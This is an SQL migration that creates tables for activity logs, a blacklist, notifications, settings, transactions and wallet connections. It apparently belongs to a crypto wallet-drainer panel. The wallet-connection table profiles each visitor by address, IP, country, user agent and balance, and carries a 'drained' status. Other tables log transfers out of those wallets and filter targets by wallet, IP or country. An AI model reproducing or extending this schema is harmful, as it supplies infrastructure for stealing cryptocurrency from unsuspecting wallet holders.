CREATE TABLE `activity_logs` (
	`id` int AUTO_INCREMENT NOT NULL,
	`action` varchar(100) NOT NULL,
	`description` text,
	`ipAddress` varchar(64),
	`walletAddress` varchar(100),
	`metadata` text,
	`level` enum('info','warning','error','success') NOT NULL DEFAULT 'info',
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `activity_logs_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `blacklist` (
	`id` int AUTO_INCREMENT NOT NULL,
	`type` enum('wallet','ip','country') NOT NULL,
	`value` varchar(200) NOT NULL,
	`reason` text,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `blacklist_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `notifications` (
	`id` int AUTO_INCREMENT NOT NULL,
	`title` varchar(255) NOT NULL,
	`message` text NOT NULL,
	`type` enum('info','success','warning','error') NOT NULL DEFAULT 'info',
	`isRead` boolean NOT NULL DEFAULT false,
	`relatedId` int,
	`relatedType` varchar(50),
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `notifications_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `settings` (
	`id` int AUTO_INCREMENT NOT NULL,
	`key` varchar(100) NOT NULL,
	`value` text,
	`description` text,
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT `settings_id` PRIMARY KEY(`id`),
	CONSTRAINT `settings_key_unique` UNIQUE(`key`)
);
--> statement-breakpoint
CREATE TABLE `transactions` (
	`id` int AUTO_INCREMENT NOT NULL,
	`connectionId` int NOT NULL,
	`txHash` varchar(128),
	`fromAddress` varchar(100) NOT NULL,
	`toAddress` varchar(100) NOT NULL,
	`tokenSymbol` varchar(20) DEFAULT 'ETH',
	`tokenAddress` varchar(100),
	`amount` decimal(30,18) DEFAULT '0',
	`usdValue` decimal(20,2) DEFAULT '0',
	`network` varchar(50) DEFAULT 'ethereum',
	`chainId` int,
	`status` enum('pending','success','failed','cancelled') NOT NULL DEFAULT 'pending',
	`gasUsed` varchar(64),
	`blockNumber` bigint,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT `transactions_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `wallet_connections` (
	`id` int AUTO_INCREMENT NOT NULL,
	`walletAddress` varchar(100) NOT NULL,
	`walletType` varchar(50) NOT NULL,
	`network` varchar(50) DEFAULT 'ethereum',
	`chainId` int,
	`ipAddress` varchar(64),
	`userAgent` text,
	`status` enum('pending','connected','drained','failed') NOT NULL DEFAULT 'pending',
	`ethBalance` decimal(20,8) DEFAULT '0',
	`usdValue` decimal(20,2) DEFAULT '0',
	`country` varchar(100),
	`sessionId` varchar(128),
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT `wallet_connections_id` PRIMARY KEY(`id`)
);
